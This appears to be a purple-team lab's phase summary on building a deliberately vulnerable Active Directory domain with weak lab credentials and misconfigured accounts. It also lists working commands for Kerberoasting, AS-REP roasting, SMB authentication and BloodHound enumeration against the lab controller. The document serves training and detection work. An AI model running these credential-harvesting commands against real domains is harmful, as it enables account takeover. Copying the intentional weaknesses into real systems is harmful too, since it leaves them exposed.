# Phase 3 Summary — Active Directory Domain

## Goal
Add a Windows Active Directory segment to the lab so the purple-team exercise can include real AD attack paths, detection opportunities, and lateral movement.

## What was built

| Segment | Gateway | Hosts |
|---|---|---|
| Lab-Internal | `10.10.0.2` | Kali (`10.10.0.10`), Wazuh SIEM (`10.10.0.30`) |
| TargetNet | `10.20.0.2` | Juice Shop (`10.20.0.20`) |
| ADNet | `10.30.0.2` | DC01 (`10.30.0.10`), Win10-1 (`10.30.0.11`) |

### New VMs

- **`lab-dc01`** — Windows Server 2022 Standard, domain controller for `purple.lab`, DNS, AD DS.
- **`lab-win10-1`** — Windows 10 Enterprise, joined to `purple.lab`.

The `lab-router` VM was expanded with a third host-only adapter on ADNet and now routes/NATs between all three segments.

### Domain content created

- **OUs:** `LabUsers`, `ServiceAccounts`
- **Users:**
  - `alice` / `Password123!` — Domain Admin (intentional over-privilege)
  - `bob` / `Summer2024!` — AS-REP roastable (`DoesNotRequirePreAuth`)
  - `carol` / `Password123!` — regular user, password reuse with `alice`
  - `svc_sql` / `SqlSvc123!` — service account with SPN `MSSQLSvc/dc01.purple.lab:1433` (Kerberoastable)
  - `svc_web` / `WebSvc2024!` — additional service account
- **Share:** `\\dc01\Public` with `Everyone:Modify` ACL
- **Wazuh agents:** installed on both Windows endpoints, reporting to `10.10.0.30`

## Verified attacks

All of the following were executed successfully from Kali and returned usable attack artifacts.

| Attack | Command / Tool | Result |
|---|---|---|
| Kerberoasting | `GetUserSPNs.py purple.lab/alice:Password123! -dc-ip 10.30.0.10 -request` | TGS hash for `svc_sql` captured |
| AS-REP roasting | `GetNPUsers.py purple.lab/bob -no-pass -dc-ip 10.30.0.10` | AS-REP hash for `bob` captured |
| SMB auth | `netexec smb 10.30.0.10 -u alice -p 'Password123!'` | `Pwn3d!` |
| Share enum | `smbclient -L //10.30.0.10 -U 'purple.lab\alice%Password123!'` | `Public`, `ADMIN$`, `C$`, `SYSVOL`, etc. listed |
| BloodHound | `bloodhound-python -d purple.lab -u alice -p 'Password123!' -ns 10.30.0.10 -dc dc01.purple.lab -c All --zip` | `*_bloodhound.zip` produced |

## SIEM visibility

Wazuh manager reports all four endpoints **Active**:

```
ID: 001, Name: kali-lab,   Active
ID: 002, Name: juice-shop, Active
ID: 003, Name: dc01,       Active
ID: 004, Name: win10-1,    Active
```

## Lessons learned

Captured in detail in [`LESSONS.md`](LESSONS.md). The most important Phase 3 lessons are:

1. **LDAP/DNS fix for BloodHound** — Kali cannot resolve `dc01.purple.lab` by default. Use `bloodhound-python` with `-ns 10.30.0.10` or add `10.30.0.10 dc01.purple.lab` to `/etc/hosts`.
2. **Secure-channel repair for Win10** — The evaluation Windows 10 client occasionally breaks its domain secure channel after the first reboot. Automated repair is now part of the provisioning script.
3. Windows AD promotion is silent and slow; always use transcript logging.
4. `vagrant-reload` is required to reboot Windows guests mid-provision.

## Snapshot to restore

To repeat Phase 3 from a clean state, restore the `clean-phase3` snapshot on every VM:

```bash
cd cyber-lab
vagrant snapshot restore router clean-phase3
vagrant snapshot restore siem clean-phase3
vagrant snapshot restore kali clean-phase3
vagrant snapshot restore target clean-phase3
vagrant snapshot restore dc clean-phase3
vagrant snapshot restore win10 clean-phase3
```

All VMs are currently running and snapshotted as `clean-phase3`.

## Next step

Phase 4 can now be started. Candidate directions:

- **Detection engineering:** tune Wazuh rules for the verified attacks (Kerberoasting, AS-REP, SMB brute-force, DCSync attempts).
- **C2 / post-exploitation:** deploy a C2 framework (e.g., Sliver, Mythic) on Kali or a dedicated C2 VM and practice payload delivery + exfiltration detection.
- **Lateral movement & persistence:** add GPO abuse, scheduled tasks, golden/silver ticket prep, or credential dumping defenses.
- **Application target on ADNet:** add a vulnerable Windows service / MSSQL instance for the `svc_sql` SPN to make Kerberoasting more realistic.
